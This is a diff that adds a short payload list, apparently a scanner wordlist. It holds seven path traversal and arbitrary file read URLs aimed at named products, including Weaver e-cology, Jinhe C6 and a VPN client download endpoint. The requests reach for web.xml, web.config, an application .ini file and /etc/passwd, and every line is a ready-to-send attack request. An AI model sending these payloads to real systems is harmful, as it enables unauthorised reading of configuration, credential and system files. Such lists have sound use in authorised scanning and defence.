@@ -1,0 +1,7 @@
+/assets/../package.json
+/weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml
+/C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config
+/c6/JHSoft.Web.CustomQuery/UploadFileDownLoadnew.aspx/?FilePath=../Resource/JHFileConfig.ini
+/selfservice/selfservice/module/scgroup/web/login_judge.jsf?view=./WEB-INF/web.xml%3F
+/vpn/user/download/client?ostype=../../../../../../../etc/passwd
+/defaultroot/download_ftp.jsp?path=/../WEB-INF/&name=aaa&FileName=web.xml
